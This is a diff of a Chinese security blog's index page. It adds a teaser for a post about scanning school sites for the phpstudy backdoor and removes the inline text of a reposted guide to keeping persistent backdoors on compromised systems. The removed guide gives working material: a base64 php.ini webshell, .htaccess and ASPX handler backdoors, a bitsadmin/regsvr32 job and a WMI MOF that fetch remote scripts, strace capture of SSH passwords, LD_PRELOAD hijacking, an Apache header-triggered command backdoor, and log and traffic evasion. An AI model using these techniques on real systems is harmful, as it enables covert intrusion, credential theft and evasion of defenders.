@@ -169,6 +169,86 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-phpstudy后门引发渗透" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/">phpstudy存在后门</a>
+    </h1>
+  
+
+        
+        <a href="/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/" class="archive-article-date">
+  	<time datetime="2020-04-19T04:41:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间 phpstudy 被爆出存在后门，想到学校里的许多站都是用 phpstudy 做的环境，于是写了个脚本扫描了下，发现真的有中招的。<br></p>
+        
+          <a class="article-more-a" href="/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/#more">more >></a>
+        
+      
+
+		
+		
+		  <div hidden="hidden"></div>
+		
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">渗透</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-渗透中的后门利用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -192,111 +272,9 @@
         <p>本文转自<strong>中国白客联盟</strong>，如有侵权请联系作者，马上删除</p>
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要介绍权限维持，介绍如何在有一定权限的情况下，留下后门。当然各类后门太多太多了，这里主要列举一些常用的、方便的。</p>
 <hr>
-<h2 id="WEB类"><a href="#WEB类" class="headerlink" title="WEB类"></a>WEB类</h2><p>本类主要介绍基于web类的一些后门，比如大家熟知的webshell。</p>
-<h3 id="php站点"><a href="#php站点" class="headerlink" title="php站点"></a>php站点</h3><ol>
-<li><strong>.user.ini</strong><br>当我们服务器是以fastcgi运行的php，我们就可以使用该方法进行后门操作。</li>
-</ol>
-<p>当我们配置.user.ini时，在该文件中插入auto_prepend_file=evil.txt 时，就可以做到访问当前目录下的所有php文件时，就自动包含这个evil.txt：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/1.png" alt></p>
-<ol start="2">
-<li><p><strong>.htaccess</strong><br>站长经常用.htaccess做伪静态，我们也可以拿来做后门。<br>自定义.htaccess上传，下面是内容</p>
-<p> <FileMatch "aaa"><br> SetHandler application/x-httpd-php<br> </FileMatch><br>同目录下，上传一个名称包含aaa的文件，就可以把此文件当成php解析。</p>
-</li>
-<li><p><strong>php.ini</strong><br>修改php.ini，添加如下内容：</p>
-<p> allow_url_include=On<br> auto_prepend_file=”data:;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW2NtZF0pOz8+”<br>重启php后，访问任意php页面都可以自动包含上述webshell，即解码后的</p>
-<p> &lt;?php @eval($_REQUEST[cmd]);?&gt;</p>
-</li>
-</ol>
-<p><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/2.png" alt></p>
-<ol start="4">
-<li><p><strong>pher</strong><br>php有个环境变量：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/3.png" alt><br>默认该目录不存在，创建即可，然后在该目录下放置一个webshell，然后在web目录写个包含该webshell的代码即可：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/4.png" alt><br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/5.png" alt></p>
-</li>
-<li><p><strong>asp（x）站点</strong><br>bin目录下存放的dll主要是作为aspx文件拿来映射的，可以理解为访问aspx文件时，可以调用bin目录下的dll里面的类。而web.config又可以控制映射逻辑。</p>
-</li>
-</ol>
-<ul>
-<li>aspxceshi目录存放一个webshell，如jumbo.aspx</li>
-<li>执行如下命令：<br>  C:\Windows\Microsoft.NET\Framework\v2.0.50727\aspnet_compiler.exe -v / -p c:\Users\Jumbo\Desktop\aspxceshi\webshell\ c:\Users\Jumbo\Desktop\aspxceshi\webshellbin\</li>
-<li>就会在webshellbin目录生成dll文件：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/6.png" alt><br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/7.png" alt></li>
-<li>复制compilde文件里面的assembly值和 type值</li>
-<li><p>修改网站根目录的web.config，添加如下代码：</p>
-<p>  &lt;system.web&gt;</p>
-<pre><code>  &lt;httpHandlers&gt;
-      &lt;add verb=&quot;*&quot; path=&quot;*&quot; type=&quot;assembly值, type值&quot; validate=&quot;True&quot;/&gt;
-  &lt;/httpHandlers&gt;
-&lt;/system.web&gt;
-</code></pre></li>
-<li><p>把生成的dll放到网站bin目录</p>
-</li>
-<li>访问任意地址都是webshell</li>
-</ul>
-<p><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/8.png" alt></p>
-<ol start="5">
-<li><strong>jsp(x)站点</strong><br>具体详情可以找陆军长。<br>这里涉及版权问题，不提供思路和代码，直接看效果：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/8.png" alt></li>
-</ol>
-<h3 id="系统类"><a href="#系统类" class="headerlink" title="系统类"></a>系统类</h3><p>主要介绍基于系统类的一些后门，比如大家熟知的启动项之类</p>
-<h3 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h3><p>在windows中，可以添加例如如下注册表：</p>
-<pre><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
-</code></pre><p>即可让机器重启后自动加载你的payload。</p>
-<h3 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h3><p>bitsadmin也可以做启动项：<br>    bitsadmin /create backdoor<br>    bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe<br>    bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe “/u /s /i:<a href="https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct" target="_blank" rel="noopener">https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct</a> scrobj.dll”<br>    bitsadmin /Resume backdoor</p>
-<h3 id="mof"><a href="#mof" class="headerlink" title="mof"></a>mof</h3><pre><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)   
-instance of __EventFilter as $EventFilter
-{
-  EventNamespace = &quot;Root\\Cimv2&quot;;
-    Name  = &quot;filtP1&quot;;
-    Query = &quot;Select * From __InstanceModificationEvent &quot;
-            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;
-            &quot;And TargetInstance.Second = 1&quot;;
-    QueryLanguage = &quot;WQL&quot;;
-};   
-instance of ActiveScriptEventConsumer as $Consumer
-{
-    Name = &quot;consP1&quot;;
-    ScriptingEngine = &quot;JScript&quot;;
-    ScriptText = &quot;GetObject(\&quot;script:http://172.16.127.1:2333/aaaa\&quot;)&quot;;
-};   
-instance of __FilterToConsumerBinding
-{
-    Consumer   = $Consumer;
-    Filter = $EventFilter;
-};
-
-mofcomp 1.mof
-</code></pre><h3 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h3><p>com劫持、签名伪造、wmi、镜像劫持、netsh后门、Office。太多太多了，就不一一展开讲了。</p>
-<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h3><p>这里可以利用alias别名记录root密码：</p>
-<pre><code>https://mp.weixin.qq.com/s?__biz=MzA4NjQxMDcxNA==&amp;mid=2709352583&amp;idx=1&amp;sn=5d1fd02840f0c070036f9c0e70b23958
-</code></pre><h3 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h3><p>利用strace抓ssh密码</p>
-<pre><code>strace -f -p sshdpid-o sshd.out.txt -v -e trace=read,write -s 128
-</code></pre><h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>在linux中，我们可以利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。<br>我们可以通过修改动态链接库为我们恶意的so文件时，即可劫持相关函数。<br>就以常用的劫持getuid()为例。<br>man 2 getuid 查看函数原型：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/9.png" alt><br>编写恶意劫持getuid的c文件：</p>
-<p><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/10.png" alt><br>编译成so文件：<br>    gcc -shared -fPIC evil.c -o evil.so<br>为了测试，临时加载环境变量，发现成功劫持：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/11.png" alt></p>
-<h3 id="杂-1"><a href="#杂-1" class="headerlink" title="杂"></a>杂</h3><p>openssh后门、rootkit。太多太多了，就不一一展开讲了。</p>
-<h3 id="容器类"><a href="#容器类" class="headerlink" title="容器类"></a>容器类</h3><ol>
-<li>iis<br>iis中可以添加ISAPI来达到后门的效果，这里以micropoor_iis为例，请求任意地址，配置ip端口即可反弹：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/12.png" alt></li>
-<li><p>apache<br>apache中可以利用apxs生成一个扩展，然后编写相关利用payload。<br>主要是遍历header头，如果带有Backdoor，则执行命令：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/13.png" alt><br>编译、安装、启动，-a命令会自动并在httpd.conf添加loadmodule命令（LoadModule backdoor_module    /usr/lib64/httpd/modules/mod_backdoor.so）：</p>
-<p> apxs -i -a -c mod_backdoor.c &amp;&amp; service apache2 restart</p>
-</li>
-</ol>
-<p>现在请求任何页面，只要带上Backdoor头即可执行命令：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/14.png" alt></p>
-<h3 id="扩展类"><a href="#扩展类" class="headerlink" title="扩展类"></a>扩展类</h3><p>我们可以在php.ini中加载恶意的扩展，达到访问任意php页面都可以执行payload的目的。<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/15.png" alt></p>
-<h3 id="软件类"><a href="#软件类" class="headerlink" title="软件类"></a>软件类</h3><p>当一个exe运行加载dll时，他的顺序是：</p>
-<pre><code>a. 应用程序所在目录；
-b. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\Windows\System32；
-c. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；
-d. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\Windows；
-e. 当前目录。GetCurrentDirectory返回的目录；
-f. 环境变量PATH中所有目录。
-</code></pre><p>因此我们可以使用如ProcessMonitor工具查看某个exe软件运行时会调用哪些dll，并且这个dll不在<br>    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs<br>注册表中，可以尝试进行dll劫持。</p>
-<h3 id="日志类"><a href="#日志类" class="headerlink" title="日志类"></a>日志类</h3><p>我们正常来访问一个文件，我们看到的是这么一条200的日志：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/16.png" alt><br>那如果我们加个header头呢？在日志里面看到的就是一条404的日志：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/17.png" alt><br>但是这样就算日志看起来是404，如果人家访问一下，直接能看到结果，可能还是不太好，那就再加个user-agent的判断：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/18.png" alt></p>
-<h3 id="流量层面"><a href="#流量层面" class="headerlink" title="流量层面"></a>流量层面</h3><p>这里我以蚁剑为例。<br>我先介绍下整个加密的流程：</p>
-<pre><code>1、本地发送加密的数据包
-2、webshell解密执行命令
-3、返回数据包加密
-4、本地解密
-</code></pre><p>先根据蚁剑实例写个发送包时候的aes加密，即编码器：</p>
-<p><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/19.png" alt><br>我们选择新增的编码器后，随便往某个页面post数据，抓个包，看到我们的数据包已然是加密状态：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/20.png" alt><br>用在线的aes解密网站，然后用我们的定义的key发现也能成功解密：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/21.png" alt><br>这时候我们就到达第二步，在webshell里面做解密执行：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/22.png" alt><br>这时候连接我们的指定webshell，即可成功连接：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/23.png" alt><br>现在就需要把数据包加密返回并解密显示，也就是解码器。</p>
-<p>首先创建一个加密方法：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/24.png" alt><br>这样在数据包中客户端就会调用这个加密方法加密服务端返回的数据，我们可以把请求包解密看到详情：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/25.png" alt><br>现在服务端返回给我们的数据包就是加密的，然后本地再解密即可：</p>
-<p><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/26.png" alt></p>
-<h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>原文链接：<a href="https://mp.weixin.qq.com/s/EfzSC979qQqXxXLZsV9LpA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/EfzSC979qQqXxXLZsV9LpA</a></p>
-
+        
+          <a class="article-more-a" href="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/#more">more >></a>
+        
       
 
 		
@@ -965,86 +943,6 @@ f. 环境变量PATH中所有目录。
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2020/04/02/WEB%E6%BC%8F%E6%B4%9E-CSRF/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-常见密码字典" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/01/%E5%B8%B8%E8%A7%81%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8/">常见密码字典</a>
-    </h1>
-  
-
-        
-        <a href="/2020/04/01/%E5%B8%B8%E8%A7%81%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8/" class="archive-article-date">
-  	<time datetime="2020-04-01T06:33:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>收集一些常见密码字典<br></p>
-        
-          <a class="article-more-a" href="/2020/04/01/%E5%B8%B8%E8%A7%81%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8/#more">more >></a>
-        
-      
-
-		
-		
-		  <div hidden="hidden"></div>
-		
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">爆破</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/04/01/%E5%B8%B8%E8%A7%81%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8/">展开全文 >></a>
         </p>
       
 
